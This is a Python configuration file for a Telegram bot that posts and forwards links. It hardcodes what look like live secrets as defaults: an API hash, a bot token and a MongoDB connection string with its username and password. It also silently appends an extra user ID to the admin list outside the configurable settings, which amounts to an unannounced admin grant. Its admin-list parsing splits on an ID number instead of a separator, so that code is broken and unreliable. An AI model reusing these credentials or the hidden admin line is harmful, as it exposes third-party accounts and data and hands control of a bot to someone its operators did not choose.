# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "12124605"))
API_HASH = os.environ.get("API_HASH", "5cf3577d85fd02286535ec2296934287")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "6285348168:AAFXZVnBswWDI5eOZQiZQMLglVlROCjpvWc")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("6133440326")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Aks2")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://postbot:postbot@cluster0.ouwne8q.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "6133440326")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(6164919099)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001720210775")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "mdiskconvertorupdates") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
